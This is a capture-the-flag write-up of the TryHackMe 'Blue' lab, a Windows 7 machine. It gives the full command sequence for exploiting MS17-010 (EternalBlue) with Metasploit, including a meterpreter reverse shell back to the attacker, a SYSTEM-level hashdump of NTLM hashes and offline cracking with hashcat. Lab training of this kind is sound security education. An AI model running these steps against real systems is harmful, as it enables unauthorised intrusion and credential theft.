# Blue — TryHackMe

| Field | Value |
|---|---|
| Platform | TryHackMe |
| OS | Windows 7 |
| Difficulty | Easy |
| Release | 2018-09-20 |
| Tags | `eternalblue` `ms17-010` `smb` `metasploit` `windows-privesc` |

## TL;DR

`nmap` flags SMB on a Windows 7 host → MS17-010 vulnerability check returns positive → `exploit/windows/smb/ms17_010_eternalblue` drops a SYSTEM shell directly. Privilege escalation isn't a separate step here — the kernel exploit lands as `NT AUTHORITY\SYSTEM`. Three flags hidden across the file system.

## 1. Recon

```bash
sudo nmap -sCV -p- --min-rate 1000 -oN nmap.txt $BOX
```

```
PORT      STATE SERVICE         VERSION
135/tcp   open  msrpc           Microsoft Windows RPC
139/tcp   open  netbios-ssn     Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds    Microsoft Windows 7 Professional 7601 Service Pack 1 microsoft-ds
3389/tcp  open  ms-wbt-server   Microsoft Terminal Services
49152-49158/tcp open  msrpc     Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

What jumps out:

- **Windows 7 SP1 with SMB on 445** → MS17-010 (EternalBlue) is the obvious first thing to check. Windows 7 was the high-water mark for that CVE.
- **RDP on 3389** is open but useless until I have credentials.

## 2. Enumeration

### SMB (445)

```bash
nxc smb $BOX                          # quick fingerprint
nmap --script smb-vuln-* -p445 $BOX   # vuln-script sweep
```

The vuln scripts confirm:

```
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
```

That's the whole enumeration phase on this box. With MS17-010 confirmed, every other service is downstream — once I'm SYSTEM via SMB, I can drop credentials and pivot to RDP if I want.

## 3. Foothold

I'll use Metasploit's module because the box is built around it:

```bash
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS $BOX
set LHOST $ATTACKER
set LPORT 4444
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run
```

The module gives me a meterpreter session **as `NT AUTHORITY\SYSTEM`** directly — no separate privesc needed.

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Quick housekeeping inside meterpreter:

```
meterpreter > sysinfo
Computer        : JON-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
```

### User & SYSTEM flags

The room expects three flags, hidden in conventional Windows locations:

```cmd
C:\flag1.txt          # at the root of C:
C:\Windows\System32\config\flag2.txt
C:\Users\Jon\Documents\flag3.txt
```

```
Flag 1: <flag>
Flag 2: <flag>
Flag 3: <flag>
```

## 4. Privilege escalation

Already SYSTEM — there is no separate privesc step.

If I wanted to keep practicing, the natural follow-up is to dump local credentials with `hashdump` and crack them offline:

```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

Crack on attacker:

```bash
hashcat -m 1000 jon.hash /usr/share/wordlists/rockyou.txt
# alfred (the rockyou hit)
```

## 5. Lessons learned

> **Generalisable rule** — *Any time `nmap` shows SMB on Windows 7 / 2008, run the SMB vuln script suite **before** anything else.* MS17-010 is the most common one, but `smb-vuln-cve2009-3103`, `smb-vuln-ms08-067` and friends are in the same script category and cost nothing to check.

- Metasploit's `ms17_010_eternalblue` is reliable on Windows 7 x64. On Windows 2008 it's flakier — keep the manual `AutoBlue` exploit (`worawit/MS17-010` on GitHub) in your back pocket.
- Always check what privilege the exploit lands you as. EternalBlue gives SYSTEM directly because of the way the SMB driver runs in kernel mode; many other exploits don't, and you can waste an hour wondering why your "shell" can't read SAM.
- `nxc smb` (the NetExec rebrand of CME) is faster than nmap's NSE for the *same* fingerprinting once you've moved past the initial recon.

## Tools used

| Tool | Phase | One-liner |
|---|---|---|
| nmap | Recon | `nmap -sCV -p- --min-rate 1000` |
| nmap NSE | Enum | `nmap --script smb-vuln-* -p445` |
| nxc / NetExec | Enum | `nxc smb $BOX` |
| Metasploit | Foothold | `use exploit/windows/smb/ms17_010_eternalblue` |
| hashcat | Post | `hashcat -m 1000 hash rockyou.txt` |

## References

- [TryHackMe — Blue](https://tryhackme.com/room/blue)
- [HackTricks — Pentesting SMB (445)](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smb/index.html)
- [MS17-010 / CVE-2017-0143 — Microsoft advisory](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010)
- [worawit/MS17-010 (manual exploits)](https://github.com/worawit/MS17-010)
